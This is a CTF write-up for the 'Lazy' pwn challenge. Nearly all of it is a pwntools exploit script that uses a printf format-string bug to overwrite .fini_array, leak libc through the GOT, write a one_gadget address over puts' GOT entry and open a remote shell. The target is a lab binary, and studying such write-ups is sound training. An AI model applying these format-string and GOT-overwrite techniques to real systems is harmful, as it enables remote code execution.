# Pwn/Lazy (23 solves / 209 points)

## Description:
Perhaps printf can do more than just read from the stack. I was too lazy to find out though. There’s not even a reference to the flag anyway. Do you think you GOT this? Connect at
`nc lazy.litctf.live 1337`.

[lazy_pwn.zip](https://drive.google.com/uc?export=download&id=1AlOY4JrxyFbUQvihghInlhB7tmdY0jT_)!

## Solution:
```
from pwn import *

elf = ELF("lazy")
libc = ELF("libc-2.31.so")
#conn = elf.process()
conn = remote("lazy.litctf.live", 1337)

# overwrite _fini_array with main()
fini = 0x0000000004031c8
# overwrite char by char because we dont wanna get huge chunks of text from server
payload = b"%17c%12$hhn%47c%11$hhn%18c%13$hhnb%14$se" + p64(fini+2) + p64(fini+1) + p64(fini) + p64(elf.got['puts'])
log.info("Overwriting .fini_array with main() to get a second pass, also leaking libc")
conn.sendlineafter("?\n", payload)

conn.recvuntil('b') # identify leak
leak = u64(conn.recvuntil('e')[:-1] + b'\x00\x00') # unpack leak
log.info("puts() libc: " + hex(leak))
libc.address = leak - libc.symbols['puts']
log.info("libc base: " + hex(libc.address))

one_gadget = libc.address + 0xcbd1a # one_gadget libc-2.31.so
gadget_lower = one_gadget % 16**4
gadget_upper = (one_gadget >> 16) % 16**4
diff = gadget_upper - gadget_lower
log.info("one_gadget: " + hex(one_gadget))


log.info("Writing address of one_gadget to puts() GOT")
if diff > 0: # write the smaller one first
  payload = b"%" + str(gadget_lower).encode() + b"c%10$hn%" + str(diff).encode() +  b"c%11$hn      " + p64(elf.got['puts']) + p64(elf.got['puts']+2)
  if len(payload) == 47:
    payload = b"%" + str(gadget_lower).encode() + b"c%9$hn%" + str(diff).encode() +  b"c%10$hn" + p64(elf.got['puts']) + p64(elf.got['puts']+2)
else:
  payload = b"%" + str(gadget_upper).encode() + b"c%10$hn%" + str(abs(diff)).encode() +  b"c%11$hn      " + p64(elf.got['puts']+2) + p64(elf.got['puts'])
  if len(payload) == 47:
    payload = b"%" + str(gadget_upper).encode() + b"c%9$hn%" + str(abs(diff)).encode() +  b"c%10$hn" + p64(elf.got['puts']+2) + p64(elf.got['puts'])

conn.sendline(payload)
conn.recvuntil('\x00') # clean up output
conn.recv(5)

conn.interactive()
```